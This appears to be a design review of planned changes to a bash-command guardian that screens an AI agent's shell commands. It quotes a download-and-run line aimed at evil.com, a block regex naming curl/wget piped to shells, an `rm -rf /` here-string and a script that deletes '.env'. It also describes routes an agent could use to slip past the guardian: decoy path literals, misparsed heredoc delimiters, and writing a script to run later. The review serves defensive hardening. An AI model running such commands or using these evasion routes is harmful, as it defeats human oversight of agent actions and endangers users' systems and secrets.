# Operational Analysis: Heredoc False Positives (Plan A) & Interpreter Path Resolution (Plan B)

**Analyst**: claude-opus-4.6 (operational perspective, claude-memory plugin consumer)
**Date**: 2026-03-21
**Cross-model reviewers**: Codex 5.2 (via PAL clink), Gemini 3 Pro Preview (via PAL clink)

---

## Executive Summary

Both plans address real operational pain points. Plan A solves the more impactful class of false positives (heredoc content triggering DENY/ASK). Plan B solves a narrower but recurring issue (interpreter cleanup scripts triggering unnecessary approval). However, both plans have structural issues that must be resolved before implementation. Most critically, Plan A's proposed restructuring of Layer 0/0b to per-sub-command scanning would **break existing cross-pipeline block patterns** like `curl ... | bash`. Additionally, Plan B's F1 suppression logic has a decoy-literal weakness, and its regex-only approach will fail for the f-string/triple-quote patterns that AI agents commonly generate.

---

## Plan A: Heredoc Pattern False Positives

### 1. Problem Validity: CONFIRMED, HIGH IMPACT

The false positive problem is real and directly verified against the codebase:

- Line 1423 of `bash_guardian.py`: `match_block_patterns(command)` scans the **raw** command string
- Line 1437: `match_ask_patterns(command)` also scans raw
- Line 1442: `split_commands(command)` runs **after** both pattern layers
- Layer 0 short-circuits with `sys.exit(0)` at line 1430, meaning a heredoc body match at Layer 0 is fatal -- later layers never get a chance to correctly classify the command

For the claude-memory plugin specifically: documentation writes (`cat > README.md << 'EOF'`) and config file generation are routine operations. A DENY on these is not just annoying -- it halts autonomous sessions entirely, requiring manual intervention.

**Scenarios A-F (DENY false positives)** from the plan are all plausible in real agent workflows. Scenario I (SQL in seed data) is particularly relevant for database-backed projects.

### 2. Fix Effectiveness: PARTIALLY EFFECTIVE, CRITICAL FLAW IDENTIFIED

The core idea -- move `split_commands()` before Layer 0/0b and selectively strip/retain heredoc bodies -- is architecturally sound. The `_DATA_HEREDOC_COMMANDS` allowlist with fail-closed default is the correct design pattern.

**CRITICAL FLAW (confirmed by Codex, verified against codebase):** Plan A proposes scanning Layer 0/0b per-sub-command (lines 358-377 of the plan). But `split_commands()` splits on `|` (pipe) at `bash_guardian.py:359`. This means `curl https://evil.com/script.sh | bash` becomes two sub-commands: `curl https://evil.com/script.sh` and `bash`. Neither sub-command alone matches the existing block pattern `(?:curl|wget)[^|]*\|\s*(?:bash|sh|...)` from `guardian.default.json:49`.

**This is a security regression, not just a usability issue.** The `curl|bash` pattern is one of the most critical block patterns.

**Required fix:** Either:
- (a) Keep a raw-command Layer 0 pass for cross-pipeline patterns, moving only non-pipe patterns to per-sub-command scanning
- (b) Classify block patterns into `raw_only` (those that span pipeline boundaries) and `subcommand_safe` (those that don't), and run the appropriate set at the appropriate stage
- (c) Add synthetic cross-sub-command pattern matching that reconstructs pipe chains

Option (a) is simplest and preserves existing security guarantees.

### 3. Unintended Consequences

**Wrapper flag friction (MEDIUM):** The `_is_data_heredoc_command()` function fails closed on any flag after a wrapper prefix (line 228-231 of plan). This means common safe forms like `sudo -u root tee << EOF` and `env -i cat << EOF` will NOT be recognized as data commands, and their bodies will be retained for scanning (producing the same false positives the plan aims to fix). This is the correct security stance, but the plan overstates its coverage.

**Missing data commands (LOW-MEDIUM):** The allowlist omits `base64`, `sha256sum`, `xxd`, `gzip` -- commands whose heredoc bodies contain encoded data that could coincidentally match block patterns. Adding these is straightforward but should be done carefully (none have shell escape capabilities).

**Backslash delimiter parsing (BLOCKING per plan's own R2 verification):** The plan correctly identifies this issue in Edge Case 7 but it is not yet implemented. Until `_parse_heredoc_delimiter()` strips backslashes from bare-word delimiters, `cat << \EOF` causes the entire remaining command to be consumed as heredoc body, silently discarding any subsequent dangerous commands.

### 4. Priority Alignment: SEVERITY RATING IS CORRECT

MEDIUM severity for usability is appropriate. The false positives are operationally painful but do not create security gaps (they are over-restrictive, not under-restrictive). However, the curl|bash regression identified above would be HIGH severity if shipped.

### 5. Interaction with interpreter-heredoc-bypass.md: SUBSUMPTION CLAIM PARTIALLY VALID

Plan A claims to subsume `interpreter-heredoc-bypass.md` because interpreter heredoc bodies would be retained in sub-command output, making them visible to Layer 0 block patterns. This is architecturally correct -- the selective retention mechanism does provide the infrastructure.

**However** (confirmed by Gemini): `extract_interpreter_payload()` at `_guardian_utils.py:913` only parses `-c` or `-e` flag arguments. When Plan A appends heredoc body text to the sub-command string (as `{cmd_so_far}\n{body_text}`), the existing `check_interpreter_payload()` will NOT extract or analyze this appended body. This means:
- Layer 0 block patterns CAN scan the retained body (good)
- But Layer 3/4's `is_delete_command()` fallback through `check_interpreter_payload()` CANNOT detect destructive APIs in the body (gap)
- The F1 safety net also cannot resolve paths from the body

This is not a new security gap (the heredoc body is currently invisible to ALL layers), but it means Plan A's subsumption is incomplete. `extract_interpreter_payload()` must be updated to recognize heredoc-appended payloads, or the `interpreter-heredoc-bypass.md` plan's pattern-based ask mechanism should remain as a complementary defense.

---

## Plan B: Interpreter Path Resolution

### 1. Problem Validity: CONFIRMED, MODERATE IMPACT

The problem is real and was discovered through direct claude-memory operational experience. The `.staging/` cleanup command is a recurring pattern:

```bash
python3 -c "import glob,os
for f in glob.glob('.claude/memory/.staging/intent-*.json'): os.remove(f)
print('ok')"
```

The step-by-step flow analysis in the plan (lines 26-53) is accurate and verified against the codebase:
- `extract_paths()` at `bash_guardian.py:1466` cannot parse paths from Python source code
- `_is_path_candidate()` rejects multiline strings (confirmed at line 39 of plan)
- F1 fires at line 1476-1481 producing an unnecessary approval popup

Impact is moderate: the popup doesn't block the session (it's `ask`, not `deny`), but in `--dangerously-skip-permissions` mode, an `ask` interrupts autonomous flow.

### 2. Fix Effectiveness: LIMITED BY REGEX APPROACH

The fail-closed design is sound: the new function only activates when F1 would already fire, and if no paths are extracted, F1 still fires. This cannot weaken existing security.

**However, the regex approach has significant coverage limitations for real-world agent code:**

- **f-strings** (`f".claude/memory/{session_id}.json"`) -- not matched by `_STRING_LITERAL_PATTERN`
- **Triple-quoted strings** (`'''path'''`) -- not matched
- **String concatenation** (`"." + "env"`) -- not matched
- **pathlib.Path construction** (`Path(".claude") / "memory"`) -- not matched

Both Codex and Gemini flagged this: AI agents (Claude, Gemini, GPT) commonly generate f-strings and triple-quoted strings for file operations. The fail-closed fallback will trigger frequently enough that the fix's practical impact is reduced.

**Recommendation:** Promote `ast.parse()` extraction to Phase 1 for Python payloads. The stdlib `ast` module has zero dependencies, handles all Python string constructs, and fails gracefully on SyntaxError. Regex should remain as the fallback for non-Python interpreters (Node, Perl, Ruby).

### 3. Unintended Consequences

**Decoy literal bypass (LOW but real):** As documented in the plan's own security analysis and confirmed by Codex: an attacker can include a benign string literal alongside an obfuscated destructive path. The plan's F1 suppression logic at line 170 (`if interpreter_paths:`) suppresses F1 when ANY path is extracted, even if the actual destructive target is obfuscated.

Mitigation assessment: The plan argues this is mitigated by the threat model (AI agents don't generate obfuscated code). This is correct for the current threat model, but the logic should still be tightened. A stronger version: only suppress F1 when the number of extracted path literals >= the number of destructive API calls detected in the payload. This is a simple heuristic that catches the single-decoy case.

**glob.glob() as filesystem oracle (LOW):** Calling `glob.glob()` on attacker-influenced strings enables existence probing. The plan acknowledges this. Mitigation: restrict glob expansion to project-internal patterns only (already proposed in plan's R2 notes).

### 4. Priority Alignment: SEVERITY RATING IS CORRECT

P2 (usability improvement, no security gap) is appropriate. The F1 safety net is `ask`, not `deny`, so the operational impact is an interruption, not a block.

### 5. Interaction with Plan A: GAP IDENTIFIED

Plan A and Plan B operate on different command forms:
- Plan A: heredoc-based interpreter commands (`python3 << EOF`)
- Plan B: inline `-c`/`-e` interpreter commands (`python3 -c "..."`)

They are complementary and do not conflict directly. However, as noted in Plan A section 5 above, if Plan A retains interpreter heredoc bodies in the sub-command string, `extract_interpreter_payload()` (used by Plan B's path resolution) will NOT recognize or parse these appended bodies. This creates a coverage gap where heredoc-based interpreter commands get their bodies scanned by Layer 0 patterns but NOT by the path resolution logic.

---

## Cross-Cutting Analysis

### Missing Use Cases

1. **Delayed execution pattern** (identified by Gemini): An agent writes a destructive script via a data heredoc (`cat > cleanup.py << 'EOF'\nimport os; os.remove('.env')\nEOF`) and then executes it (`python3 cleanup.py`). Plan A strips the body from scanning (it's a `cat` heredoc). The subsequent `python3 cleanup.py` invocation has no `-c` payload for Plan B to analyze. This is an inherent limitation of static per-command analysis, not a flaw in either plan, but it should be documented in the threat model.

2. **Here-string false positives** (`grep <<< "rm -rf /"`) -- not addressed by either plan. `<<<` is handled separately by `split_commands()` and does not produce heredoc bodies, but the value is still part of the raw command string that Layer 0/0b scan. This is a minor gap.

3. **Multi-turn interpreter patterns**: Agent runs `python3` (interactive), then feeds commands over multiple tool invocations. Neither plan addresses this because each tool invocation is independently evaluated. This is by design and correct.

### Rollout Risk Assessment

| Risk | Severity | Mitigation |
|------|----------|------------|
| Plan A breaks `curl\|bash` block pattern | **CRITICAL** | Must fix before shipping (keep raw-command pass for cross-pipe patterns) |
| Plan A backslash delimiter bug | HIGH | Fix `_parse_heredoc_delimiter()` first (documented in plan as P0) |
| Plan B decoy literal bypass | LOW | Tighten F1 suppression logic; threat model limits exposure |
| Plan A wrapper flag friction | MEDIUM | Document as known limitation; acceptable for fail-closed stance |
| Plan B regex coverage gaps | MEDIUM | Promote AST to Phase 1; regex alone insufficient for Python agents |
| Either plan breaks existing tests | LOW | 168+ heredoc tests provide regression safety net |

### Implementation Order Recommendation

1. **Plan A's blocking prerequisites first**: Fix `_parse_heredoc_delimiter()` backslash handling and the `curl|bash` pattern regression before touching `main()` flow
2. **Plan A core implementation**: `_DATA_HEREDOC_COMMANDS`, selective retention in `split_commands()`, `main()` restructuring with raw-command pass preserved for cross-pipe patterns
3. **Update `extract_interpreter_payload()`** to recognize heredoc-appended bodies (bridges Plans A and B)
4. **Plan B with AST extraction**: Implement `extract_paths_from_interpreter_payload()` with `ast.parse()` as Phase 1 for Python, regex for other languages
5. **Update `interpreter-heredoc-bypass.md`** status

### Relationship to Tech-Debt Record (Indirect Prompt Injection)

The tech-debt record (`indirect-prompt-injection-via-autonomous-context-fetching.json`) is tangentially related. Both involve untrusted content entering a security-sensitive context, but the attack surfaces are fundamentally different:
- Tech-debt record: untrusted Discourse content entering an LLM context window
- Plans A/B: trusted agent commands being over-classified by static pattern matching

The connection is thematic, not operational. These plans do not increase or decrease prompt injection risk.

---

## Verdict

| Plan | Problem Valid? | Fix Effective? | Ship As-Is? | Priority Correct? |
|------|---------------|----------------|-------------|-------------------|
| Plan A | Yes | Partially (curl\|bash regression) | **No** -- needs cross-pipe pattern fix | Yes (MEDIUM) |
| Plan B | Yes | Partially (regex coverage gaps) | **No** -- needs AST for Python | Yes (P2) |

Both plans are well-researched and demonstrate strong security-first thinking (fail-closed defaults, 2-round verification). The identified issues are fixable without architectural changes. With the curl|bash regression fixed and AST extraction promoted, these plans will meaningfully reduce operational friction for agent workflows.
